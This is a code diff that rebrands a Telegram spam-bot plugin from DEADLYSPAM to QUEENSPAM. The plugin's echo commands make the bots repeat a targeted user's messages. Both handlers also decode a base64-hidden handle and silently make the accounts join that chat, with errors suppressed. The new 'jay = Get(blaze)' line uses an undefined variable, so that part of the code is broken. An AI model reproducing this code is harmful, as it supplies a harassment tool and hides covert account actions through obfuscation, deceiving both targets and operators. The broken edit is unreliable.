@@ -6,10 +6,10 @@ import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from DEADLYSPAM import BOT0, BOT1, BOT2, BOT3, BOT4, BOT5, BOT6, BOT7, BOT8, BOT9, SUDO_USERS, OWNER_ID
-from DEADLYSPAM import CMD_HNDLR as hl
-from resources.data import GROUP, DEADLYSPAM
-from DEADLYSPAM.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from QUEENSPAM import BOT0, BOT1, BOT2, BOT3, BOT4, BOT5, BOT6, BOT7, BOT8, BOT9, SUDO_USERS, OWNER_ID
+from QUEENSPAM import CMD_HNDLR as hl
+from resources.data import GROUP, QUEENSPAM
+from QUEENSPAM.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
 @BOT0.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@@ -28,14 +28,14 @@ async def echo(event):
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
-            if int(user_id) in DEADLYSPAM:
-                    text = f"I Can't Echo @deadly_spam_bot Owner"
+            if int(user_id) in QUEENSPAM:
+                    text = f"ɪ ᴀɴ'ᴛ ᴇᴄʜᴏ ʙᴏᴛ ᴏᴡɴᴇʀ"
                     await event.reply(text, parse_mode=None, link_preview=None )
             elif int(user_id) == OWNER_ID:
-                    text = f"This Guy is Owner Of These Bots."
+                    text = f"ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇꜱᴇ ʙᴏᴛꜱ."
                     await event.reply(text, parse_mode=None, link_preview=None )
             elif int(user_id) in SUDO_USERS:
-                    text = f"This Guy is a Sudo User."
+                    text = f"ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ."
                     await event.reply(text, parse_mode=None, link_preview=None )
             else:
                  chat_id = event.chat_id
@@ -46,10 +46,10 @@ async def echo(event):
                  except BaseException:
                     pass
                  if is_echo(user_id, chat_id):
-                     await event.reply("Echo Is Already Activated On This User !!")
+                     await event.reply("ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪꜱ ᴜꜱᴇʀ !")
                      return
                  addecho(user_id, chat_id)
-                 await event.reply("Echo Activated On The User ✅")
+                 await event.reply("ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜᴇ ᴜꜱᴇʀ ")
      else:
           await event.reply(usage)
 
@@ -71,16 +71,16 @@ async def echo(event):
             user_id = reply_msg.sender_id
             chat_id = event.chat_id
             try:
-                blaze = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
-                blaze = Get(blaze)
+                jay = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
+                jay = Get(blaze)
                 await event.client(blaze)
             except BaseException:
                 pass
             if is_echo(user_id, chat_id):
                 remove_echo(user_id, chat_id)
-                await event.reply("Echo Has Been Stopped For The User ☑️")
+                await event.reply("ᴇᴄʜᴏ ʜᴀꜱ ʙᴇᴇɴ ꜱᴛᴏᴘᴘᴇᴅ ꜰᴏʀ ᴛʜᴇ ᴜꜱᴇʀ ")
             else:
-                await event.reply("Echo Is Already Disabled !!")
+                await event.reply("ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴅɪꜱᴀʙʟᴇᴅ !!")
      else:
           await event.reply(usage)
 
